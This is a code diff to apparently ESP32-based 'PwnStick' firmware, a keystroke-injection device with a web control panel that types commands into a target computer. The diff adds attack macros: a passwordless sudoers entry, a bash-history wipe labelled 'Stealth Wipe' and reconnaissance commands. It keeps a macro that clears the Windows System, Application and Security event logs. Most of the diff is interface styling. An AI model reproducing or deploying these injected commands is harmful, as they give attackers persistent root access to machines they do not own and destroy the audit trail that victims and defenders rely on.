@@ -64,7 +64,7 @@ const char index_html[] PROGMEM = R"rawliteral(
 <!DOCTYPE html>
 <html>
 <head>
-<title>PwnStick v47</title>
+<title>PwnStick v49</title>
 <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
 <style>
 * { user-select:none; -webkit-user-select:none; box-sizing:border-box; }
@@ -79,9 +79,9 @@ button:active { background:#0f0; color:#000; }
 button.toggled { background:#0f0 !important; color:#000 !important; box-shadow:0 0 10px #0f0; }
 .row { display:flex; gap:5px; width:100%; flex-shrink:0; }
 textarea { width:100%; height:45px; background:#111; color:#0f0; border:1px dashed #333; padding:8px; font-size:1.1em; outline:none; flex-shrink:0; user-select:auto; -webkit-user-select:auto; }
-#pad-wrap { flex:1; display:flex; flex-direction:column; min-height:80px; }
+#pad-wrap { flex:1; display:flex; flex-direction:column; min-height:100px; }
 #pad { flex:1; background:#0a0a0a; border:1px solid #333; display:flex; align-items:center; justify-content:center; color:#222; border-radius:8px 8px 0 0; font-weight:bold; font-size:20px; touch-action:none; }
-.click-row { display:flex; height:45px; gap:2px; flex-shrink:0; }
+.click-row { display:flex; height:50px; gap:2px; flex-shrink:0; }
 .click-btn { flex:1; background:#080808; border:1px solid #333; border-top:none; border-radius:0 0 4px 4px; }
 .click-btn:active { background:#111; border-color:#0f0; }
 #crop-wrap { width:100%; max-width:600px; border:1px solid #333; margin:0 auto; background:#050505; position:relative; overflow:hidden; aspect-ratio:160/80; flex-shrink:1; }
@@ -92,11 +92,10 @@ textarea { width:100%; height:45px; background:#111; color:#0f0; border:1px dash
 .opt-box { background:#111; border:1px solid #333; padding:8px; display:none; flex-direction:column; gap:4px; text-align:left; font-size:11px; flex-shrink:0; }
 .opt-row { display:flex; justify-content:space-between; align-items:center; }
 input[type=number] { background:#000; color:#0f0; border:1px solid #0f0; width:45px; padding:3px; }
-/* Modal */
-#modal { position:fixed; top:0; left:0; width:100%; height:100%; background:rgba(0,0,0,0.9); display:none; flex-direction:column; padding:20px; z-index:100; }
-.modal-header { display:flex; gap:10px; margin-bottom:20px; }
+#modal { position:fixed; top:0; left:0; width:100%; height:100%; background:rgba(0,0,0,0.95); display:none; flex-direction:column; padding:20px; z-index:100; }
+.modal-header { display:flex; gap:10px; margin-bottom:20px; flex-shrink:0; }
 .modal-body { flex:1; overflow-y:auto; display:grid; grid-template-columns:1fr 1fr; gap:10px; padding-bottom:20px; }
-.modal-close { background:#333; color:#fff; border:none; padding:15px; border-radius:4px; margin-top:10px; }
+.modal-close { background:#333; color:#fff; border:none; padding:15px; border-radius:4px; margin-top:10px; flex-shrink:0; }
 </style>
 </head>
 <body>
@@ -115,14 +114,13 @@ input[type=number] { background:#000; color:#0f0; border:1px solid #0f0; width:4
         <button id="mod-ctrl" onmousedown="mD('ctrl',this)" onmouseup="mU('ctrl',this)">CTRL</button>
         <button id="mod-alt" onmousedown="mD('alt',this)" onmouseup="mU('alt',this)">ALT</button>
         <button id="mod-shift" onmousedown="mD('shift',this)" onmouseup="mU('shift',this)">SHIFT</button>
-        <button onclick="oM()" style="background:#050;border-color:#0f0;color:#fff">MACROS</button>
+        <button onclick="oM()" style="background:#050;border-color:#0f0;color:#fff;flex:1.5">LIBRARY (MACROS)</button>
     </div>
     <textarea id="ta" placeholder="Type here..."></textarea>
     <div id="pad-wrap">
         <div id="pad">TRACKPAD</div>
         <div class="click-row"><div class="click-btn" onmousedown="wsS('D:l')" onmouseup="wsS('U:l')" ontouchstart="wsS('D:l')" ontouchend="wsS('U:l')"></div><div class="click-btn" onmousedown="wsS('D:r')" onmouseup="wsS('U:r')" ontouchstart="wsS('D:r')" ontouchend="wsS('U:r')"></div></div>
     </div>
-    <div class="row"><button onclick="wsS('A:term')">TERM</button><button onclick="wsS('A:calc')">CALC</button><button onclick="wsS('A:rick')">RICK</button><button onclick="wsS('A:snake')">SNAKE</button></div>
 </div>
 <div id="c-ig" class="content">
     <div class="file-btn"><button style="width:100%">SELECT IMAGE</button><input type="file" id="img-f" accept="image/*"></div>
@@ -143,14 +141,16 @@ let ws=new WebSocket('ws://'+location.host+'/ws');
 let os='win', isGif=false, gifBytes=null;
 const mcs = {
     win: [
+        {n:'Terminal', a:'term'}, {n:'Calculator', a:'calc'}, {n:'Rickroll', a:'rick'},
         {n:'Admin PS', a:'ps_admin'}, {n:'WiFi Pass', a:'wifi_pass'}, 
         {n:'Fake Update', a:'fake_upd'}, {n:'Notepad Ghost', a:'note_ghost'},
         {n:'Clear Logs', a:'win_clr'}, {n:'System Info', a:'win_info'}
     ],
     lin: [
-        {n:'Recon', a:'lin_recon'}, {n:'Snake (SSH)', a:'snake'},
-        {n:'CMatrix', a:'cmatrix'}, {n:'Fake Bomb', a:'fork_bomb'},
-        {n:'Net Info', a:'lin_net'}, {n:'Home Listing', a:'lin_ls'}
+        {n:'Terminal', a:'term'}, {n:'Calculator', a:'calc'}, {n:'SSH Snake', a:'snake'},
+        {n:'Rickroll', a:'rick'}, {n:'Sys Recon', a:'lin_recon'}, 
+        {n:'Net Info', a:'lin_net'}, {n:'Stealth Wipe', a:'lin_ls'},
+        {n:'Add Sudoer', a:'lin_sudo'}
     ]
 };
 function wsS(m){if(ws.readyState===1)ws.send(m);}
@@ -170,7 +170,6 @@ function uM(){
         l.appendChild(b);
     });
 }
-function uOS(){ uM(); }
 function mD(m,el){ el.dataset.h=setTimeout(()=>{ el.classList.toggle('toggled'); wsS('H:'+m+','+(el.classList.contains('toggled')?'1':'0')); el.dataset.h=0; },500); }
 function mU(m,el){ if(el.dataset.h){ clearTimeout(el.dataset.h); wsS('P:'+m); el.dataset.h=0; } }
 let ta=document.getElementById('ta');
@@ -181,7 +180,7 @@ ta.onkeydown=e=>{
     if(e.key==='Backspace'){ e.preventDefault(); wsS('B:1'); return; }
 };
 ta.oninput=e=>{ if(e.inputType==='insertFromPaste'||ta.value.length>1){wsS('V:'+ta.value);ta.value='';}else{let c=ta.value.slice(-1);ta.value='';if(c)wsS('K:'+c);} };
-// Trackpad
+// Trackpad - Fixed Relative Drag with Sensitivity
 let p=document.getElementById('pad'),lX=0,lY=0,isD=false,tapT=0;
 p.onmousedown=e=>{ isD=true; lX=e.clientX; lY=e.clientY; tapT=Date.now(); };
 window.onmouseup=()=>{ if(isD && Date.now()-tapT<200) wsS('C:l'); isD=false; };
@@ -325,11 +324,10 @@ void handleWebSocketMessage(void *arg, uint8_t *data, size_t len) {
             else if(act=="note_ghost") { Keyboard.press(KEY_LEFT_GUI); Keyboard.print("r"); delay(200); Keyboard.releaseAll(); delay(500); Keyboard.println("notepad"); delay(1000); Keyboard.println("I am watching you..."); }
             else if(act=="win_clr") { Keyboard.press(KEY_LEFT_GUI); Keyboard.print("r"); delay(200); Keyboard.releaseAll(); delay(500); Keyboard.println("powershell -NoP -Command \"Clear-EventLog -LogName System,Application,Security\""); }
             else if(act=="win_info") { Keyboard.press(KEY_LEFT_GUI); Keyboard.print("r"); delay(200); Keyboard.releaseAll(); delay(500); Keyboard.println("cmd /k systeminfo"); }
-            else if(act=="lin_recon") { Keyboard.press(KEY_LEFT_CTRL); Keyboard.press(KEY_LEFT_ALT); Keyboard.press('t'); delay(500); Keyboard.releaseAll(); delay(800); Keyboard.println("whoami; uname -a; ifconfig; ls -la ~"); }
-            else if(act=="cmatrix") { Keyboard.press(KEY_LEFT_CTRL); Keyboard.press(KEY_LEFT_ALT); Keyboard.press('t'); delay(500); Keyboard.releaseAll(); delay(800); Keyboard.println("cmatrix"); }
-            else if(act=="fork_bomb") { Keyboard.press(KEY_LEFT_CTRL); Keyboard.press(KEY_LEFT_ALT); Keyboard.press('t'); delay(500); Keyboard.releaseAll(); delay(800); Keyboard.println("# :(){ :|:& };:"); }
+            else if(act=="lin_recon") { Keyboard.press(KEY_LEFT_CTRL); Keyboard.press(KEY_LEFT_ALT); Keyboard.press('t'); delay(500); Keyboard.releaseAll(); delay(800); Keyboard.println("hostnamectl; timedatectl; lsusb; lscpu; ip a"); }
             else if(act=="lin_net") { Keyboard.press(KEY_LEFT_CTRL); Keyboard.press(KEY_LEFT_ALT); Keyboard.press('t'); delay(500); Keyboard.releaseAll(); delay(800); Keyboard.println("ip addr; nmcli device wifi list"); }
-            else if(act=="lin_ls") { Keyboard.press(KEY_LEFT_CTRL); Keyboard.press(KEY_LEFT_ALT); Keyboard.press('t'); delay(500); Keyboard.releaseAll(); delay(800); Keyboard.println("ls -R ~"); }
+            else if(act=="lin_ls") { Keyboard.press(KEY_LEFT_CTRL); Keyboard.press(KEY_LEFT_ALT); Keyboard.press('t'); delay(500); Keyboard.releaseAll(); delay(800); Keyboard.println("history -c && history -w && exit"); }
+            else if(act=="lin_sudo") { Keyboard.press(KEY_LEFT_CTRL); Keyboard.press(KEY_LEFT_ALT); Keyboard.press('t'); delay(500); Keyboard.releaseAll(); delay(800); Keyboard.println("echo \"$USER ALL=(ALL) NOPASSWD:ALL\" | sudo tee /etc/sudoers.d/99-pwn"); }
             else if(act=="term") { if(targetOS=="win") { Keyboard.press(KEY_LEFT_GUI); Keyboard.press('r'); delay(300); Keyboard.releaseAll(); delay(800); Keyboard.println("cmd"); } else { Keyboard.press(KEY_LEFT_CTRL); Keyboard.press(KEY_LEFT_ALT); Keyboard.press('t'); delay(300); Keyboard.releaseAll(); } }
             else if(act=="calc") { if(targetOS=="win") { Keyboard.press(KEY_LEFT_GUI); Keyboard.press('r'); delay(300); Keyboard.releaseAll(); delay(800); Keyboard.println("calc"); } else { Keyboard.press(KEY_LEFT_ALT); Keyboard.press(KEY_F2); delay(500); Keyboard.releaseAll(); delay(1000); Keyboard.print("gnome-calculator"); delay(100); Keyboard.write(KEY_RETURN); } }
             else if(act=="rick") { if(targetOS=="win") { Keyboard.press(KEY_LEFT_GUI); Keyboard.press('r'); delay(300); Keyboard.releaseAll(); delay(800); Keyboard.println("https://www.youtube.com/watch?v=dQw4w9WgXcQ"); } else { Keyboard.press(KEY_LEFT_ALT); Keyboard.press(KEY_F2); delay(300); Keyboard.releaseAll(); delay(800); Keyboard.print("xdg-open 'https://www.youtube.com/watch?v=dQw4w9WgXcQ'"); delay(50); Keyboard.write(KEY_RETURN); } }
